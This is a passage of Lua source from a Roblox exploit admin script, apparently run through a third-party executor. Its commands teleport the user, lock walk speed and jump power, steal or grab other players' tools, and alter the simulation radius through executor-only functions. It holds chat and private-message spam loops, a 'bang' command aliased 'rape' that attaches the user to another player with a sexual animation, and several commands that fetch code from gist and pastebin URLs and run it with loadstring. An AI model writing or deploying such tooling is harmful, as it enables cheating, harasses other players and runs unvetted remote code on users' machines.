	addcmd('unedgejump',{'noedgejump', 'noejump', 'unejump'},function(args, speaker)
		HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or nil
		HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or nil
	end)

	addcmd('team',{},function(args, speaker)
		local teamname = nil
		for a,b in pairs(game:GetService("Teams"):GetChildren()) do
			local L_name = b.Name:lower()
			local F = L_name:find(getstring(1))
			if F == 1 then
				teamname = b 
			end
		end
		speaker.Team = teamname
	end)

	addcmd('nobgui',{'unbgui','nobillboardgui','unbillboardgui','noname','rohg'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants())do
			if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
				v:Destroy()
			end
		end
	end)

	addcmd('loopnobgui',{'loopunbgui','loopnobillboardgui','loopunbillboardgui','loopnoname','looprohg'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants())do
			if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
				v:Destroy()
			end
		end
		local function charPartAdded(part)
			if part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
				wait()
				part:Destroy()
			end
		end
		charPartTrigger = speaker.Character.DescendantAdded:Connect(charPartAdded)
	end)

	addcmd('unloopnobgui',{'unloopunbgui','unloopnobillboardgui','unloopunbillboardgui','unloopnoname','unlooprohg'},function(args, speaker)
		if charPartTrigger then
			charPartTrigger:Disconnect()
		end
	end)

	addcmd('spasm',{},function(args, speaker)
		if not r15(speaker) then
			local pchar=speaker.Character
			local AnimationId = "33796059"
			SpasmAnim = Instance.new("Animation")
			SpasmAnim.AnimationId = "rbxassetid://"..AnimationId
			Spasm = pchar.Humanoid:LoadAnimation(SpasmAnim)
			Spasm:Play()
			Spasm:AdjustSpeed(99)
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('unspasm',{'nospasm'},function(args, speaker)
		Spasm:Stop()
		SpasmAnim:Destroy()
	end)

	addcmd('headthrow',{},function(args, speaker)
		if not r15(speaker) then
			local AnimationId = "35154961"
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://"..AnimationId
			local k = speaker.Character.Humanoid:LoadAnimation(Anim)
			k:Play(0)
			k:AdjustSpeed(1)
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('animation',{'anim'},function(args, speaker)
		if not r15(speaker) then
			local pchar=speaker.Character
			local AnimationId = tostring(args[1])
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://"..AnimationId
			local k = pchar.Humanoid:LoadAnimation(Anim)
			k:Play()
			if args[2] then
				k:AdjustSpeed(tostring(args[2]))
			end
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('noanim',{},function(args, speaker)
		speaker.Character.Animate.Disabled = true
	end)

	addcmd('reanim',{},function(args, speaker)
		speaker.Character.Animate.Disabled = false
	end)

	addcmd('animspeed',{},function(args, speaker)
		local Char = speaker.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:AdjustSpeed(tonumber(args[1] or 1))
		end
	end)

	addcmd('copyanimation',{'copyanim','copyemote'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for _,v in ipairs(players)do
			local char = Players[v].Character
			for _, v1 in pairs(speaker.Character.Humanoid:GetPlayingAnimationTracks()) do
				v1:Stop()
			end
			for _, v1 in pairs(Players[v].Character.Humanoid:GetPlayingAnimationTracks()) do
				if not string.find(v1.Animation.AnimationId, "507768375") then
					local ANIM = speaker.Character.Humanoid:LoadAnimation(v1.Animation)
					ANIM:Play(.1, 1, v1.Speed)
					ANIM.TimePosition = v1.TimePosition
					spawn(function()
						v1.Stopped:Wait()
						ANIM:Stop()
						ANIM:Destroy()
					end)
				end
			end
		end
	end)

	addcmd('stopanimations',{'stopanims','stopanim'},function(args, speaker)
		local Char = speaker.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:Stop()
		end
	end)

	addcmd('refreshanimations', {'refreshanimation','refreshanims','refreshanim','reanim'},function(args, speaker)
		local Char = speaker.Character
		local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
		local Animate = Char and Char.FindFirstChild(Char, "Animate")
		Animate.Disabled = true
		for _, v in ipairs(Human.GetPlayingAnimationTracks(Human)) do
			v.Stop(v, 0)
		end
		Animate.Disabled = false
	end)

	addcmd('loopanimation', {'loopanim'},function(args, speaker)
		local Char = speaker.Character
		local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
		for _, v in ipairs(Human.GetPlayingAnimationTracks(Human)) do
			v.Looped = true
		end
	end)

	addcmd('tpposition',{'tppos'},function(args, speaker)
		if #args < 3 then return end
		local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
		local char = speaker.Character
		if char and getRoot(char) then
			getRoot(char).CFrame = CFrame.new(tpX,tpY,tpZ)
		end
	end)

	addcmd('tweentpposition',{'ttppos'},function(args, speaker)
		if #args < 3 then return end
		local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
		local char = speaker.Character
		if char and getRoot(char) then
			game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(tpX,tpY,tpZ)}):Play()
		end
	end)

	addcmd('offset',{},function(args, speaker)
		if #args < 3 then
			return 
		end
		if speaker.Character then
			speaker.Character:TranslateBy(Vector3.new(tonumber(args[1]) or 0, tonumber(args[2]) or 0, tonumber(args[3]) or 0))
		end
	end)

	addcmd('tweenoffset',{'toffset'},function(args, speaker)
		if #args < 3 then return end
		local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
		local char = speaker.Character
		if char and getRoot(char) then
			game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(tpX,tpY,tpZ)}):Play()
		end
	end)

	addcmd('clickteleport',{},function(args, speaker)
		if speaker == Players.LocalPlayer then
			notify('Click TP','Go to Settings>Keybinds>Add to set up click tp')
		end
	end)

	addcmd('tptool', {'teleporttool'}, function(args, speaker)
		local TpTool = Instance.new("Tool")
		TpTool.Name = "Teleport Tool"
		TpTool.RequiresHandle = false
		TpTool.Parent = speaker.Backpack
		TpTool.Activated:Connect(function()
			local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
			local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
			if not Char or not HRP then
				return warn("Failed to find HumanoidRootPart")
			end
			HRP.CFrame = CFrame.new(IYMouse.Hit.X, IYMouse.Hit.Y + 3, IYMouse.Hit.Z, select(4, HRP.CFrame:components()))
		end)
	end)

	addcmd('clickdelete',{},function(args, speaker)
		if speaker == Players.LocalPlayer then
			notify('Click Delete','Go to Settings>Keybinds>Add to set up click delete')
		end
	end)

	addcmd('getposition',{'getpos','notifypos','notifyposition'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			local char = Players[v].Character
			local pos = char and (getRoot(char) or char:FindFirstChildWhichIsA("BasePart"))
			pos = pos and pos.Position
			if not pos then
				return notify('Getposition Error','Missing character')
			end
			local roundedPos = math.round(pos.X) .. ", " .. math.round(pos.Y) .. ", " .. math.round(pos.Z)
			notify('Current Position',roundedPos)
		end
	end)

	addcmd('copyposition',{'copypos'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			local char = Players[v].Character
			local pos = char and (getRoot(char) or char:FindFirstChildWhichIsA("BasePart"))
			pos = pos and pos.Position
			if not pos then
				return notify('Getposition Error','Missing character')
			end
			local roundedPos = math.round(pos.X) .. ", " .. math.round(pos.Y) .. ", " .. math.round(pos.Z)
			toClipboard(roundedPos)
		end
	end)

	addcmd('walktopos',{'walktoposition'},function(args, speaker)
		if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
			speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			wait(.1)
		end
		speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(args[1],args[2],args[3])
	end)

	addcmd('speed',{'ws','walkspeed'},function(args, speaker)
		if args[2] then
			local speed = args[2] or 16
			if isNumber(speed) then
				speaker.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = speed
			end
		else
			local speed = args[1] or 16
			if isNumber(speed) then
				speaker.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = speed
			end
		end
	end)

	addcmd('loopspeed',{'loopws'},function(args, speaker)
		local speed = args[1] or 16
		if args[2] then
			speed = args[2] or 16
		end
		if isNumber(speed) then
			local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
			local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
			local function WalkSpeedChange()
				if Char and Human then
					Human.WalkSpeed = speed
				end
			end
			WalkSpeedChange()
			HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
			HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
				Char, Human = nChar, nChar:WaitForChild("Humanoid")
				WalkSpeedChange()
				HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
			end)
		end
	end)

	addcmd('unloopspeed',{'unloopws'},function(args, speaker)
		HumanModCons.wsLoop = (HumanModCons.wsLoop and HumanModCons.wsLoop:Disconnect() and false) or nil
		HumanModCons.wsCA = (HumanModCons.wsCA and HumanModCons.wsCA:Disconnect() and false) or nil
	end)

	addcmd('loopjumppower',{'loopjp','loopjpower'},function(args, speaker)
		local jpower = args[1] or 50
		if isNumber(jpower) then
			local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
			local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
			local function JumpPowerChange()
				if Char and Human then
					Human.JumpPower = jpower
				end
			end
			JumpPowerChange()
			HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("JumpPower"):Connect(JumpPowerChange)
			HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
				Char, Human = nChar, nChar:WaitForChild("Humanoid")
				JumpPowerChange()
				HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("JumpPower"):Connect(JumpPowerChange)
			end)
		end
	end)

	addcmd('unloopjumppower',{'unloopjp','unloopjpower'},function(args, speaker)
		HumanModCons.jpLoop = (HumanModCons.jpLoop and HumanModCons.jpLoop:Disconnect() and false) or nil
		HumanModCons.jpCA = (HumanModCons.jpCA and HumanModCons.jpCA:Disconnect() and false) or nil
	end)

	addcmd('tools',{'gears'},function(args, speaker)
		local function copy(instance)
			for i,c in pairs(instance:GetChildren())do
				if c:IsA('Tool') or c:IsA('HopperBin') then
					c:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
				end
				copy(c)
			end
		end
		copy(game:GetService("Lighting"))
		local function copy(instance)
			for i,c in pairs(instance:GetChildren())do
				if c:IsA('Tool') or c:IsA('HopperBin') then
					c:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
				end
				copy(c)
			end
		end
		copy(game:GetService("ReplicatedStorage"))
		notify('Tools','Copied tools from ReplicatedStorage and Lighting')
	end)

	addcmd('notools',{'rtools','clrtools','removetools','deletetools','dtools'},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetDescendants()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:Destroy()
			end
		end
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:Destroy()
			end
		end
	end)

	addcmd('deleteselectedtool',{'dst'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA('Tool') or v:IsA('HopperBin') then
				v:Destroy()
			end
		end
	end)

	addcmd('console',{},function(args, speaker)
		-- Thanks wally!!
		notify("Loading",'Hold on a sec')
		local _, str = pcall(function()
			return game:HttpGet("https://gist.githubusercontent.com/luatsuki/a1b48e02d5710ebff8fe1ffb1fc5ea38/raw/055143d9238eb6645fbb1f5c4a9a0122ca90c8f4/Console", true)
		end)

		local s, e = loadstring(str)
		if typeof(s) ~= "function" then
			return
		end

		local success, message = pcall(s)
		if (not success) then
			if printconsole then
				printconsole(message)
			elseif printoutput then
				printoutput(message)
			end
		end
		wait(1)
		notify('Console','Press F9 to open the console')
	end)

	addcmd('explorer',{'dex'},function(args, speaker)
		notify("Loading",'Hold on a sec')
		local Dex = game:GetObjects("rbxassetid://3567096419")[1]
		Dex.Parent = PARENT

		local function Load(Obj, Url)
			local function GiveOwnGlobals(Func, Script)
				local Fenv = {}
				local RealFenv = {script = Script}
				local FenvMt = {}
				FenvMt.__index = function(a,b)
					if RealFenv[b] == nil then
						return getfenv()[b]
					else
						return RealFenv[b]
					end
				end
				FenvMt.__newindex = function(a, b, c)
					if RealFenv[b] == nil then
						getfenv()[b] = c
					else
						RealFenv[b] = c
					end
				end
				setmetatable(Fenv, FenvMt)
				setfenv(Func, Fenv)
				return Func
			end
			local function LoadScripts(Script)
				if Script.ClassName == "Script" or Script.ClassName == "LocalScript" then
					spawn(function()
						GiveOwnGlobals(loadstring(Script.Source, "=" .. Script:GetFullName()), Script)()
					end)
				end
				for i,v in pairs(Script:GetChildren()) do
					LoadScripts(v)
				end
			end
			LoadScripts(Obj)
		end

		Load(Dex)
	end)

	addcmd('remotespy',{'rspy'},function(args, speaker)
		notify("Loading",'Hold on a sec')
		-- Full credit to exx, creator of SimpleSpy
		loadstring(game:HttpGet("https://gist.githubusercontent.com/luatsuki/c75a272fb67bccc22bd1b6add92ee267/raw/56375f8536aeca0cc84b44032312efb0fa5b7fa0/Spy"))()
	end)

	addcmd('audiologger',{'alogger'},function(args, speaker)
		notify("Loading",'Hold on a sec')
		loadstring(game:HttpGet(('https://pastebin.com/raw/GmbrsEjM'),true))()
	end)

	local loopgoto = nil
	addcmd('loopgoto',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			loopgoto = nil
			if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			loopgoto = Players[v]
			local distance = 3
			if args[2] and isNumber(args[2]) then
				distance = args[2]
			end
			local lDelay = 0
			if args[3] and isNumber(args[3]) then
				lDelay = args[3]
			end
			repeat
				if Players:FindFirstChild(v) then
					if Players[v].Character ~= nil then
						getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(distance,1,0)
					end
					wait(lDelay)
				else
					loopgoto = nil
				end
			until loopgoto ~= Players[v]
		end
	end)

	addcmd('unloopgoto',{'noloopgoto'},function(args, speaker)
		loopgoto = nil
	end)

	addcmd('headsit',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			speaker.Character:FindFirstChildOfClass('Humanoid').Sit = true
			headSit = game:GetService("RunService").Heartbeat:Connect(function()
				if Players[v].Character ~= nil and getRoot(Players[v].Character) and getRoot(speaker.Character) then
					if Players:FindFirstChild(Players[v].Name) and speaker.Character:FindFirstChildOfClass('Humanoid').Sit == true then
						getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,1.6,0.4)
					else
						headSit:Disconnect()
					end
				end
			end)
		end
	end)

	addcmd('chat',{'say'},function(args, speaker)
		local cString = getstring(1)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cString, "All")
	end)

	spamming = false
	spamspeed = 1
	addcmd('spam',{},function(args, speaker)
		spamming = true
		local spamstring = getstring(1)
		repeat wait(spamspeed)
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamstring, "All")
		until spamming == false
	end)

	addcmd('nospam',{'unspam'},function(args, speaker)
		spamming = false
	end)

	addcmd('whisper',{'pm'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local plrName = Players[v].Name
				local pmstring = getstring(2)
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plrName.." "..pmstring, "All")
			end)
		end
	end)

	pmspamming = {}
	addcmd('pmspam',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				local plrName = Players[v].Name
				if FindInTable(pmspamming, plrName) then return end
				table.insert(pmspamming, plrName)
				local pmspamstring = getstring(2)
				repeat
					if Players:FindFirstChild(v) then
						wait(spamspeed)
						game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plrName.." "..pmspamstring, "All")
					else
						for a,b in pairs(pmspamming) do if b == plrName then table.remove(pmspamming, a) end end
					end
				until not FindInTable(pmspamming, plrName)
			end)
		end
	end)

	addcmd('nopmspam',{'unpmspam'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				for a,b in pairs(pmspamming) do
					if b == Players[v].Name then
						table.remove(pmspamming, a)
					end
				end
			end)
		end
	end)

	addcmd('spamspeed',{},function(args, speaker)
		local speed = args[1] or 1
		if isNumber(speed) then
			spamspeed = speed
		end
	end)

	bubblechatting = false
	local getBubblechat
	addcmd('bubblechat',{},function(args, speaker)
		if bubblechatting then return end
		bubblechatting = true
		if getBubblechat then getBubblechat:Disconnect() end
		getBubblechat = Players.PlayerAdded:Connect(function(plr)
			local chatfunc
			chatfunc = plr.Chatted:Connect(function(chat)
				if bubblechatting == true then
					game:GetService("Chat"):Chat(plr.Character.Head,chat,Enum.ChatColor.White)
				else
					chatfunc:Disconnect()
				end
			end)
		end)
		for i,v in pairs(Players:GetPlayers()) do
			local chatfunc
			chatfunc = v.Chatted:Connect(function(chat)
				if bubblechatting == true then
					game:GetService("Chat"):Chat(v.Character.Head,chat,Enum.ChatColor.White)
				else
					chatfunc:Disconnect()
				end
			end)
		end
	end)

	addcmd('unbubblechat',{'nobubblechat'},function(args, speaker)
		bubblechatting = false
		if getBubblechat then getBubblechat:Disconnect() end
	end)

	addcmd('safechat',{},function(args, speaker)
		speaker.SetSuperSafeChat(true)
	end)

	addcmd('nosafechat',{'disablesafechat','unsafechat'},function(args, speaker)
		speaker.SetSuperSafeChat(false)
	end)

	addcmd('blockhead',{},function(args, speaker)
		speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
	end)

	addcmd('blockhats',{},function(args, speaker)
		for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
			for i,c in pairs(v:GetDescendants()) do
				if c:IsA("SpecialMesh") then
					c:Destroy()
				end
			end
		end
	end)

	addcmd('blocktool',{},function(args, speaker)
		for _,v in pairs(speaker.Character:GetChildren()) do
			if v:IsA("Tool") or v:IsA("HopperBin") then
				for i,c in pairs(v:GetDescendants()) do
					if c:IsA("SpecialMesh") then
						c:Destroy()
					end
				end
			end
		end
	end)

	addcmd('creeper',{},function(args, speaker)
		if r15(speaker) then
			speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
			speaker.Character.LeftUpperArm:Destroy()
			speaker.Character.RightUpperArm:Destroy()
			speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
		else
			speaker.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
			speaker.Character["Left Arm"]:Destroy()
			speaker.Character["Right Arm"]:Destroy()
			speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
		end
	end)

	addcmd('bang',{'rape'},function(args, speaker)
		if not r15(speaker) then
			execCmd('unbang')
			wait()
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				bangAnim = Instance.new("Animation")
				bangAnim.AnimationId = "rbxassetid://148840371"
				bang = speaker.Character.Humanoid:LoadAnimation(bangAnim)
				bang:Play(.1, 1, 1)
				if args[2] then
					bang:AdjustSpeed(args[2])
				else
					bang:AdjustSpeed(3)
				end
				local bangplr = Players[v].Name
				bangDied = speaker.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
					bangLoop:Disconnect()
					bang:Stop()
					bangAnim:Destroy()
					bangDied:Disconnect()
				end)
				bangLoop = game:GetService('RunService').Stepped:Connect(function()
					pcall(function()
						getRoot(Players.LocalPlayer.Character).CFrame = getRoot(Players[bangplr].Character).CFrame
					end)
				end)
			end
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('unbang',{'unrape'},function(args, speaker)
		if bangLoop then
			bangLoop:Disconnect()
			bangDied:Disconnect()
			bang:Stop()
			bangAnim:Destroy()
		end
	end)

	addcmd('carpet',{},function(args, speaker)
		if not r15(speaker) then
			execCmd('uncarpet')
			wait()
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players)do
				carpetAnim = Instance.new("Animation")
				carpetAnim.AnimationId = "rbxassetid://282574440"
				carpet = speaker.Character.Humanoid:LoadAnimation(carpetAnim)
				carpet:Play(.1, 1, 1)
				local carpetplr = Players[v].Name
				carpetDied = speaker.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
					carpetLoop:Disconnect()
					carpet:Stop()
					carpetAnim:Destroy()
					carpetDied:Disconnect()
				end)
				carpetLoop = game:GetService('RunService').Heartbeat:Connect(function()
					pcall(function()
						getRoot(Players.LocalPlayer.Character).CFrame = getRoot(Players[carpetplr].Character).CFrame
					end)
				end)
			end
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('uncarpet',{'nocarpet'},function(args, speaker)
		if carpetLoop then
			carpetLoop:Disconnect()
			carpetDied:Disconnect()
			carpet:Stop()
			carpetAnim:Destroy()
		end
	end)

	addcmd('friend',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			speaker:RequestFriendship(v)
		end
	end)

	addcmd('unfriend',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			speaker:RevokeFriendship(v)
		end
	end)

	addcmd('bringpart',{},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
				v.CFrame = getRoot(speaker.Character).CFrame
			end
		end
	end)

	addcmd('bringpartclass',{'bpc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
				v.CFrame = getRoot(speaker.Character).CFrame
			end
		end
	end)

	gotopartDelay = 0.1
	addcmd('gotopart',{'topart'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				getRoot(speaker.Character).CFrame = v.CFrame
			end
		end
	end)

	addcmd('tweengotopart',{'tgotopart','ttopart'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
			end
		end
	end)

	addcmd('gotopartclass',{'gpc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				getRoot(speaker.Character).CFrame = v.CFrame
			end
		end
	end)

	addcmd('tweengotopartclass',{'tgpc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
			end
		end
	end)

	addcmd('gotomodel',{'tomodel'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("Model") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				getRoot(speaker.Character).CFrame = v:GetModelCFrame()
			end
		end
	end)

	addcmd('tweengotomodel',{'tgotomodel','ttomodel'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("Model") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v:GetModelCFrame()}):Play()
			end
		end
	end)

	addcmd('gotopartdelay',{},function(args, speaker)
		local gtpDelay = args[1] or 0.1
		if isNumber(gtpDelay) then
			gotopartDelay = gtpDelay
		end
	end)

	addcmd('noclickdetectorlimits',{'nocdlimits','removecdlimits'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("ClickDetector") then
				v.MaxActivationDistance = math.huge
			end
		end
	end)

	addcmd('fireclickdetectors',{'firecd','firecds'},function(args, speaker)
		if fireclickdetector then
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("ClickDetector") then
					fireclickdetector(v)
				end
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing fireclickdetector)')
		end
	end)

	simRadius = false
	addcmd('simulationradius',{'simradius'},function(args, speaker)
		if sethidden then		
			simRadLoop = game:GetService('RunService').Stepped:Connect(function()
				if setsimulation then
					setsimulation(1e308, 1/0)
				else	
					sethidden(speaker,"MaximumSimulationRadius",1/0)
					sethidden(speaker,"SimulationRadius", 1e308)
				end
			end)
			simRadius = true
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('nosimulationradius',{'nosimradius','unsimradius'},function(args, speaker)
		if sethidden then		
			if simRadLoop then simRadLoop:Disconnect() end
			wait()
			if setsimulation then
				setsimulation(139,139)
			else	
				sethidden(speaker,"MaximumSimulationRadius",139)
				sethidden(speaker,"SimulationRadius", 139)
			end
			simRadius = false
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('grabtools', {}, function(args, speaker)
		local Human = speaker.Character:FindFirstChildWhichIsA("Humanoid")
		for _, v in ipairs(workspace:GetChildren()) do
			if speaker.Character and v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
				Human:EquipTool(v)
			end
		end
		if grabtoolsFunc then grabtoolsFunc:Disconnect() end
		grabtoolsFunc = workspace.ChildAdded:Connect(function(v)
			if speaker.Character and v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
				speaker.Character:WaitForChild("Humanoid"):EquipTool(v)
			end
		end)
		notify('Grabtools', 'Picking up any dropped tools')
	end)

	addcmd('nograbtools',{'ungrabtools'},function(args, speaker)
		if grabtoolsFunc then grabtoolsFunc:Disconnect() end
		notify('Grabtools','Grabtools has been disabled')
	end)

	addcmd('light',{},function(args, speaker)
		local light = Instance.new("PointLight")
		light.Parent = getRoot(speaker.Character)
		light.Range = 30
		if args[1] then
			light.Brightness = args[2]
			light.Range = args[1]
		else
			light.Brightness = 5
		end
	end)

	addcmd('unlight',{'nolight'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v.ClassName == "PointLight" then
				v:Destroy()
			end
		end
	end)

	addcmd('copytools',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				for i,v in pairs(Players[v]:FindFirstChildOfClass("Backpack"):GetChildren()) do
					if v:IsA('Tool') or v:IsA('HopperBin') then
						v:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
					end
				end
			end)
		end
	end)

	addcmd('naked',{},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
				v:Destroy()
			end
		end
